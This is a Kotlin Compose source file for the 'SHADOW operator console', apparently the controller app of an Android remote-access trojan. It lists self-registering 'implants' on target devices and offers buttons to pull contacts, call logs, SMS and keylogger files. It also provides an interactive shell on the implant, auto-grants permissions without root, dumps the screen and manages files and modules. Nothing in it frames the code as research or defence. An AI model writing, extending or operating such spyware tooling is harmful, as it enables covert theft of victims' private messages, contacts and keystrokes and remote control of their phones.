package com.shadow.operator.ui.fleet

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.material3.HorizontalDivider
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.ClientConfig
import com.shadow.operator.data.CommandOutcome
import com.shadow.operator.data.ResultHolder
import com.shadow.operator.data.ImplantEvent
import com.shadow.operator.data.RpcClient
import com.shadow.operator.data.Target
import com.shadow.operator.data.TargetStatus
import com.shadow.operator.data.TargetStore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

private val BgDark = Color(0xFF0A0E14)
private val PanelBg = Color(0xFF141A23)
private val AccentGreen = Color(0xFF3FE07A)
private val AccentAmber = Color(0xFFF0B429)
private val AccentRed = Color(0xFFFF5C5C)
private val AccentPurple = Color(0xFF9D7BFF)
private val TextDim = Color(0xFF8892A4)

/** One logged line in the operator's activity feed. */
private data class LogLine(
    val ts: Long = System.currentTimeMillis(),
    val kind: Kind,
    val title: String,
    val body: String,
) {
    enum class Kind { OK, ERR, INFO, EVENT }
}

/**
 * Commands that return a data set rather than a one-line answer. These open the
 * data screen (searchable, row-per-record) instead of a log line.
 */
private val DATA_COMMANDS = setOf(
    "contacts", "calllog", "sms", "keylog_file", "keylog_list", "perms", "apps"
)

private val DATA_ROUTES = mapOf(
    "contacts" to "contacts",
    "sms" to "sms",
    "calllog" to "calllog",
    // perms opens the Access panel: the grant table plus the native grant flow.
    "perms" to "access",
)

private data class ActionData(
    val label: String,
    val icon: ImageVector,
    val color: Color,
    val command: String,
)

@Composable
fun FleetScreen(
    config: ClientConfig,
    onImplantSelect: () -> Unit,
    onFileManager: () -> Unit,
    onModules: () -> Unit,
    onTerminal: () -> Unit,
    onData: () -> Unit,
    onCapability: (String) -> Unit = { onData() },
) {
    val scope = rememberCoroutineScope()
    val rpc = remember(config) { RpcClient(config) }

    val ctx = androidx.compose.ui.platform.LocalContext.current
    val store = remember { TargetStore(ctx) }
    val targets = remember { store.load() }
    var selected by remember {
        mutableStateOf(store.selectedId().ifBlank { config.implantId })
    }
    var showTargets by remember { mutableStateOf(false) }
    var newTargetId by remember { mutableStateOf("") }

    // Keep the RPC client pointed at whichever target the operator picked.
    LaunchedEffect(selected) { rpc.targetId = selected }

    var status by remember { mutableStateOf(TargetStatus.EMPTY) }
    var lines by remember { mutableStateOf(listOf<LogLine>()) }
    var inFlight by remember { mutableStateOf(setOf<String>()) }
    var liveFeed by remember { mutableStateOf(true) }
    var lastEventTs by remember { mutableStateOf(0L) }
    var now by remember { mutableStateOf(System.currentTimeMillis()) }
    val scroll = rememberScrollState()
    val clipboard = LocalClipboardManager.current

    fun log(kind: LogLine.Kind, title: String, body: String) {
        lines = (listOf(LogLine(kind = kind, title = title, body = body)) + lines).take(200)
    }

    // ---- poll status (and events when live) ----------------------------------
    LaunchedEffect(selected, liveFeed) {
        while (true) {
            now = System.currentTimeMillis()
            val s = withContext(Dispatchers.IO) { rpc.getStatus() }
            status = s
            if (s.connected) {
                // Remember every implant we ever hear from, so the target
                // list fills itself instead of being hand-typed.
                val changed = store.upsert(
                    targets,
                    Target(
                        id = selected,
                        lastSeen = System.currentTimeMillis(),
                        lastAddr = s.raw?.get("addr")?.takeIf { !it.isJsonNull }?.asString ?: ""
                    )
                )
                if (changed) store.save(targets)
            }
            if (liveFeed) {
                val evts: List<ImplantEvent> = withContext(Dispatchers.IO) { rpc.getEvents() }
                val fresh = evts.filter { it.ts > lastEventTs }
                if (fresh.isNotEmpty()) {
                    lastEventTs = fresh.maxOf { it.ts }
                    // worker returns newest-first already in most cases; keep it stable
                    val sorted = fresh.sortedBy { it.ts }
                    lines = (sorted.map {
                        LogLine(ts = it.ts, kind = LogLine.Kind.EVENT, title = it.tag, body = it.data)
                    } + lines).take(200)
                }
            }
            delay(if (liveFeed) 3000L else 5000L)
        }
    }

    fun run(command: String, payload: String = "{}", label: String = command) {
        if (command in inFlight) return
        inFlight = inFlight + command
        scope.launch {
            val outcome = withContext(Dispatchers.IO) { rpc.executeDetailed(command, payload) }
            inFlight = inFlight - command
            when (outcome) {
                is CommandOutcome.Ok -> {
                    val route = DATA_ROUTES[command]
                    if (route != null) {
                        // Each capability has its own screen with affordances that
                        // match the data shape (threads, call types, grant states).
                        ResultHolder.title = label
                        ResultHolder.text = outcome.output
                        onCapability(route)
                    } else if (command in DATA_COMMANDS) {
                        // A contact list or SMS dump in a one-line log card is
                        // unreadable; hand it to the data screen instead.
                        ResultHolder.title = label
                        ResultHolder.text = outcome.output
                        onData()
                    } else {
                        log(LogLine.Kind.OK, label, outcome.output)
                    }
                }
                is CommandOutcome.Failed -> log(LogLine.Kind.ERR, label, outcome.error)
                is CommandOutcome.Timeout -> log(LogLine.Kind.INFO, label, outcome.display())
                is CommandOutcome.TransportError -> log(LogLine.Kind.ERR, label, outcome.why)
            }
        }
    }

    val connected = status.connected
    val age = status.ageMs(now)

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BgDark)
            .verticalScroll(scroll)
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // ---- header ----------------------------------------------------------
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text("SHADOW", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 22.sp)
                Text("operator console", color = TextDim, fontSize = 11.sp)
            }
            Surface(
                color = if (connected) AccentGreen.copy(alpha = 0.15f) else AccentRed.copy(alpha = 0.15f),
                shape = RoundedCornerShape(6.dp)
            ) {
                Row(
                    modifier = Modifier.padding(horizontal = 10.dp, vertical = 5.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Box(
                        Modifier
                            .size(7.dp)
                            .clip(RoundedCornerShape(50))
                            .background(if (connected) AccentGreen else AccentRed)
                    )
                    Text(
                        if (connected) "LIVE" else "DEAD",
                        color = if (connected) AccentGreen else AccentRed,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }

        // ---- target card -----------------------------------------------------
        Card(
            colors = CardDefaults.cardColors(containerColor = PanelBg),
            modifier = Modifier
                .fillMaxWidth()
                .clickable { showTargets = !showTargets }
        ) {
            Column(Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        "TARGET",
                        color = TextDim,
                        fontSize = 10.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.weight(1f)
                    )
                    Text(
                        if (showTargets) "▲" else "▼ ${targets.size}",
                        color = TextDim,
                        fontSize = 10.sp
                    )
                }
                Text(
                    targets.firstOrNull { it.id == selected }?.display
                        ?: selected.ifBlank { "(no target selected)" },
                    color = Color.White,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 13.sp
                )
                if (targets.isNotEmpty()) {
                    Text(
                        selected,
                        color = TextDim,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 10.sp
                    )
                }

                if (showTargets) {
                    HorizontalDivider(color = Color(0xFF232B38))
                    if (targets.isEmpty()) {
                        Text(
                            "No targets yet. A reinstall regenerates nothing now (the ID is " +
                            "derived from the device), but a target first seen on another build " +
                            "must be added below or it stays unreachable.",
                            color = TextDim,
                            fontSize = 11.sp
                        )
                    }
                    // Manual entry. /api/fleet is populated by implant self-registration,
                    // but a target can exist before the worker learns it (or the fleet
                    // binding may be unwritten entirely) -- without this box an unknown ID
                    // is simply unreachable, which reads to the operator as "DEAD".
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        OutlinedTextField(
                            value = newTargetId,
                            onValueChange = { newTargetId = it.trim() },
                            placeholder = { Text("paste implant id", fontSize = 11.sp) },
                            textStyle = LocalTextStyle.current.copy(
                                fontSize = 11.sp, fontFamily = FontFamily.Monospace
                            ),
                            singleLine = true,
                            modifier = Modifier.weight(1f)
                        )
                        Spacer(Modifier.width(6.dp))
                        TextButton(onClick = {
                            val id = newTargetId
                            if (id.length >= 8) {
                                store.upsert(targets, Target(id = id, lastSeen = System.currentTimeMillis()))
                                store.save(targets)
                                selected = id
                                store.select(id)
                                newTargetId = ""
                                showTargets = false
                            }
                        }) { Text("ADD", color = AccentGreen, fontSize = 11.sp) }
                    }
                    targets.sortedByDescending { it.lastSeen }.forEach { t ->
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(6.dp))
                                .clickable {
                                    selected = t.id
                                    store.select(t.id)
                                    showTargets = false
                                }
                                .padding(vertical = 8.dp, horizontal = 4.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                if (t.id == selected) "●" else "○",
                                color = if (t.id == selected) AccentGreen else TextDim,
                                fontSize = 12.sp
                            )
                            Spacer(Modifier.width(8.dp))
                            Column(Modifier.weight(1f)) {
                                Text(
                                    t.display,
                                    color = if (t.id == selected) AccentGreen else Color.White,
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 12.sp
                                )
                                Text(
                                    "${t.id.take(8)}…  ${ago(t.lastSeen, now)}   ${if (t.platform.isBlank()) "?" else t.platform}",
                                    color = TextDim,
                                    fontSize = 10.sp,
                                    fontFamily = FontFamily.Monospace
                                )
                            }
                            IconButton(
                                onClick = {
                                    store.remove(targets, t.id)
                                    if (selected == t.id) selected = targets.firstOrNull()?.id ?: ""
                                },
                                modifier = Modifier.size(28.dp)
                            ) {
                                Icon(
                                    Icons.Default.Delete,
                                    contentDescription = "Forget target",
                                    tint = AccentRed,
                                    modifier = Modifier.size(14.dp)
                                )
                            }
                        }
                    }
                }
                Row(horizontalArrangement = Arrangement.spacedBy(18.dp)) {
                    Stat("heartbeat", when {
                        age < 0 -> "never"
                        age < 60_000 -> "${age / 1000}s"
                        else -> "${age / 60_000}m"
                    })
                    Stat("queued", status.pendingCommands.toString())
                    Stat("results", status.queuedResults.toString())
                }
            }
        }

        // ---- shell -----------------------------------------------------------
        Card(
            colors = CardDefaults.cardColors(containerColor = PanelBg),
            modifier = Modifier
                .fillMaxWidth()
                .clickable { onTerminal() }
        ) {
            Row(
                Modifier.padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                Icon(Icons.Default.Terminal, null, tint = AccentGreen)
                Column {
                    Text("Terminal", color = Color.White, fontWeight = FontWeight.SemiBold)
                    Text("interactive shell on implant", color = TextDim, fontSize = 11.sp)
                }
            }
        }

        // ---- data extraction -------------------------------------------------
        SectionLabel("DATA EXTRACTION")
        ActionGrid(
            actions = listOf(
                ActionData("Contacts", Icons.Default.Contacts, AccentGreen, "contacts"),
                ActionData("Call Log", Icons.Default.Call, AccentGreen, "calllog"),
                ActionData("SMS", Icons.Default.Message, AccentGreen, "sms"),
                ActionData("Device Info", Icons.Default.PhoneAndroid, AccentAmber, "device_info"),
                ActionData("Keylog Today", Icons.Default.Keyboard, AccentPurple, "keylog_file"),
                ActionData("Keylog Files", Icons.Default.Folder, AccentPurple, "keylog_list"),
            ),
            inFlight = inFlight,
            onRun = { a -> run(a.command, "{}", a.label) }
        )

        // ---- automation / permissions ---------------------------------------
        SectionLabel("AUTOMATION  ·  no root, no Shizuku")
        ActionGrid(
            actions = listOf(
                ActionData("Auto-Grant All", Icons.Default.Lock, AccentGreen, "autogrant"),
                ActionData("Check Granted", Icons.Default.CheckCircle, AccentAmber, "perms"),
                ActionData("Dump Screen", Icons.Default.Visibility, AccentPurple, "screen"),
                ActionData("Running Apps", Icons.Default.Apps, AccentAmber, "apps"),
            ),
            inFlight = inFlight,
            onRun = { a -> run(a.command, "{}", a.label) }
        )

        // ---- files / modules -------------------------------------------------
        SectionLabel("TOOLS")
        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            WideButton("Files", Icons.Default.Folder, AccentAmber, Modifier.weight(1f)) { onFileManager() }
            WideButton("Modules", Icons.Default.Extension, AccentPurple, Modifier.weight(1f)) { onModules() }
            // Direct entry to the grant panel; "Check Granted" also lands there.
            WideButton("Access", Icons.Default.Lock, AccentGreen, Modifier.weight(1f)) {
                onCapability("access")
            }
        }

        // ---- activity feed ---------------------------------------------------
        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            SectionLabel("ACTIVITY  ·  ${lines.size}")
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                Text("live", color = if (liveFeed) AccentGreen else TextDim, fontSize = 11.sp)
                Switch(
                    checked = liveFeed,
                    onCheckedChange = { liveFeed = it },
                    modifier = Modifier.height(28.dp)
                )
            }
        }

        if (lines.isEmpty()) {
            Card(colors = CardDefaults.cardColors(containerColor = PanelBg), modifier = Modifier.fillMaxWidth()) {
                Text(
                    "no activity yet\nrun a command or enable live feed",
                    color = TextDim,
                    fontSize = 12.sp,
                    modifier = Modifier.padding(16.dp)
                )
            }
        } else {
            Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                lines.forEach { line ->
                    LogCard(line) {
                        clipboard.setText(AnnotatedString(line.body))
                        log(LogLine.Kind.INFO, "clipboard", "copied ${line.title} (${line.body.length} chars)")
                    }
                }
            }
        }

        Spacer(Modifier.height(20.dp))
    }
}

@Composable
private fun SectionLabel(text: String) {
    Text(text, color = TextDim, fontSize = 10.sp, fontWeight = FontWeight.Bold)
}

private fun ago(ts: Long, now: Long): String {
    if (ts <= 0L) return "never"
    val s = (now - ts) / 1000
    return when {
        s < 60 -> "just now"
        s < 3600 -> "${s / 60}m ago"
        s < 86400 -> "${s / 3600}h ago"
        else -> "${s / 86400}d ago"
    }
}

@Composable
private fun Stat(label: String, value: String) {
    Column {
        Text(label, color = TextDim, fontSize = 10.sp)
        Text(value, color = Color.White, fontSize = 13.sp, fontFamily = FontFamily.Monospace)
    }
}

@Composable
private fun ActionGrid(
    actions: List<ActionData>,
    inFlight: Set<String>,
    onRun: (ActionData) -> Unit,
) {
    // Manual 2-column grid. The previous LazyVerticalGrid inside a scrollable
    // Column nested two vertical scrollers, which mis-measures on long content.
    actions.chunked(2).forEach { row ->
        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            row.forEach { a ->
                ActionButton(
                    label = a.label,
                    icon = a.icon,
                    color = a.color,
                    busy = a.command in inFlight,
                    modifier = Modifier.weight(1f),
                ) { onRun(a) }
            }
            if (row.size == 1) Spacer(Modifier.weight(1f))
        }
        Spacer(Modifier.height(8.dp))
    }
}

@Composable
private fun ActionButton(
    label: String,
    icon: ImageVector,
    color: Color,
    busy: Boolean,
    modifier: Modifier = Modifier,
    onClick: () -> Unit,
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = PanelBg),
        modifier = modifier.clickable(enabled = !busy) { onClick() }
    ) {
        Column(
            Modifier
                .fillMaxWidth()
                .padding(vertical = 14.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            if (busy) {
                CircularProgressIndicator(
                    modifier = Modifier.size(20.dp),
                    strokeWidth = 2.dp,
                    color = color
                )
            } else {
                Icon(icon, null, tint = color, modifier = Modifier.size(22.dp))
            }
            Text(
                label,
                color = if (busy) TextDim else Color.White,
                fontSize = 11.sp,
                fontWeight = FontWeight.Medium
            )
        }
    }
}

@Composable
private fun WideButton(
    label: String,
    icon: ImageVector,
    color: Color,
    modifier: Modifier = Modifier,
    onClick: () -> Unit,
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = PanelBg),
        modifier = modifier.clickable { onClick() }
    ) {
        Row(
            Modifier
                .fillMaxWidth()
                .padding(vertical = 14.dp),
            horizontalArrangement = Arrangement.Center,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(icon, null, tint = color, modifier = Modifier.size(18.dp))
            Spacer(Modifier.width(8.dp))
            Text(label, color = Color.White, fontSize = 12.sp)
        }
    }
}

private val tsFmt = SimpleDateFormat("HH:mm:ss", Locale.US)

@Composable
private fun LogCard(line: LogLine, onCopy: () -> Unit) {
    val accent = when (line.kind) {
        LogLine.Kind.OK -> AccentGreen
        LogLine.Kind.ERR -> AccentRed
        LogLine.Kind.INFO -> AccentAmber
        LogLine.Kind.EVENT -> AccentPurple
    }
    Card(
        colors = CardDefaults.cardColors(containerColor = PanelBg),
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onCopy() }
    ) {
        Column(Modifier.padding(10.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
            Row(
                Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text(
                    line.title,
                    color = accent,
                    fontSize = 10.sp,
                    fontWeight = FontWeight.Bold,
                    fontFamily = FontFamily.Monospace
                )
                Text(tsFmt.format(Date(line.ts)), color = TextDim, fontSize = 10.sp)
            }
            Text(
                line.body,
                color = Color.White.copy(alpha = 0.9f),
                fontSize = 11.sp,
                fontFamily = FontFamily.Monospace,
                lineHeight = 15.sp
            )
        }
    }
}